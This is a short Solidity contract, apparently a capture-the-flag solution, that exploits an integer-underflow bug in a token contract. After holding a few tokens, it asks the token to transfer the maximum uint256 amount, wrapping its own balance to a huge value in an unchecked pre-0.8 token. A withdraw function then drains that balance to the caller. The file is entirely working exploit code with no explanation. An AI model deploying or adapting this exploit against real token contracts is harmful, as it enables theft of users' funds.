// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken{
    function transfer(address _to, uint256 _amount) external returns(bool);
    function balanceOf(address _owner) external view returns(uint256);
}

contract TokenOverflow{
    // You need to transfer token to this account first
    IToken token;
    uint256 maxint = uint256(-1);
    constructor (IToken _token) public {
        token = _token;
    }
    function transferOverflow() external returns(bool){
        return token.transfer(msg.sender, maxint);
    }
    function withdraw() external returns(bool){
        return token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
